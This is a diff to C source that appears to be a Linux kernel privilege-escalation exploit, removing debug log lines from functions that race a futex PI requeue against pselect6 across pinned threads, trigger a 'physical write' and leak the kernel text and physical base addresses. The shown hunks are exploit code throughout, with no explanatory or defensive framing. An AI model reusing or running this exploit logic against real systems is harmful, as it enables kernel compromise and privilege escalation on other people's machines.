@@ -379,8 +379,6 @@ void slide_pselect_stack_copy(void) {
     syscall(SYS_gettid);
   }
   atomic_store(&slide_consume_go, 1);
-  pr_info("slide pselect syscall enter nfds=%d pad=%d\n", slide_pselect_nfds,
-          slide_syscall_pad);
   errno = 0;
   int ret = (int)syscall(SYS_pselect6, slide_pselect_nfds,
                          &in, &out, &ex, timeoutp, NULL);
@@ -521,7 +519,6 @@ static int slide_wait_for_pselect_blocked(int tid, size_t timeout_usec,
 #endif
 
 void *slide_consumer_thread(void *arg __attribute__((unused))) {
-  pr_info("slide consumer thread enter\n");
   disable_rseq_for_thread();
   pin_to_core(CONSUMER_CORE);
   atomic_store(&slide_consumer_ready, 1);
@@ -652,7 +649,6 @@ void *slide_consumer_thread(void *arg __attribute__((unused))) {
 }
 
 void *slide_waiter_thread(void *arg __attribute__((unused))) {
-  pr_info("slide waiter thread enter\n");
   int tid = (int)SYSCHK(syscall(SYS_gettid));
   atomic_store(&slide_waiter_tid, tid);
 
@@ -706,7 +702,6 @@ void *slide_waiter_thread(void *arg __attribute__((unused))) {
 }
 
 void *slide_owner_thread(void *arg __attribute__((unused))) {
-  pr_info("slide owner thread enter\n");
   if (futex_op(&slide_f_pi_target, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0) {
     pr_error("slide owner lock target errno=%d\n", errno);
     return NULL;
@@ -845,21 +840,18 @@ uint64_t slide_child_leak_stext(void) {
 
 #if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
 static int slide_child_trigger_write(void) {
-  pr_info("slide child trigger write begin\n");
   pthread_t waiter;
   pthread_t owner;
   pthread_t consumer;
   SYSCHK(pthread_create(&waiter, NULL, slide_waiter_thread, NULL));
   SYSCHK(pthread_create(&owner, NULL, slide_owner_thread, NULL));
   SYSCHK(pthread_create(&consumer, NULL, slide_consumer_thread, NULL));
-  pr_info("slide child trigger threads created\n");
 
   while (!atomic_load(&slide_waiter_waiting) ||
          !atomic_load(&slide_owner_started) ||
          !atomic_load(&slide_consumer_ready)) {
     usleep(1000);
   }
-  pr_info("slide child trigger threads ready\n");
 
   long requeue_ret = 0;
   int requeue_errno = 0;
@@ -877,8 +869,6 @@ static int slide_child_trigger_write(void) {
       usleep(SLIDE_REQUEUE_POLL_USEC);
     }
   }
-  pr_info("slide child requeue done ret=%ld errno=%d polls=%d\n",
-          requeue_ret, requeue_errno, requeue_polls);
   if (requeue_ret != -1 || requeue_errno != EDEADLK) {
     return 0;
   }
@@ -886,28 +876,21 @@ static int slide_child_trigger_write(void) {
   while (!atomic_load(&slide_route_done)) {
     usleep(1000);
   }
-  pr_info("slide child trigger route done\n");
 #if defined(APP_ACCEPT_SCHED_TRIGGER) && APP_ACCEPT_SCHED_TRIGGER
   int sched_ok = atomic_load(&slide_consume_sched_ok) != 0;
   int write_window = atomic_load(&slide_pselect_write_window) != 0;
   pr_info("slide downstream verification armed sched_ok=%d write_window=%d\n",
           sched_ok, write_window);
-  int trigger_ok = atomic_load(&slide_waiter_ok) != 0 && sched_ok;
-  pr_info("slide child trigger write done ok=%d\n", trigger_ok);
-  return trigger_ok;
+  return atomic_load(&slide_waiter_ok) != 0 && sched_ok;
 #else
-  int trigger_ok = atomic_load(&slide_waiter_ok) != 0 &&
-                   atomic_load(&slide_pselect_write_window) != 0;
-  pr_info("slide child trigger write done ok=%d\n", trigger_ok);
-  return trigger_ok;
+  return atomic_load(&slide_waiter_ok) != 0 &&
+         atomic_load(&slide_pselect_write_window) != 0;
 #endif
 }
 
 static int slide_trigger_physical_state(void) {
-  pr_info("p0 physical write trigger fork begin\n");
   pid_t child = SYSCHK(fork());
   if (child == 0) {
-    pr_info("p0 physical write child begin\n");
     SYSCHK(prctl(PR_SET_PDEATHSIG, SIGKILL));
     if (getppid() == 1) {
       _exit(1);
@@ -1195,7 +1178,6 @@ static int slide_leak_physical_base(void) {
   if (!page_base) {
     return 0;
   }
-  pr_info("p0 physical page base=%016zx gate-trigger enter\n", page_base);
   if (!slide_trigger_physical_slot(P0_ORACLE_GATE_SLOT)) {
     pr_error("p0 physical pipe gate trigger failed\n");
     return 0;
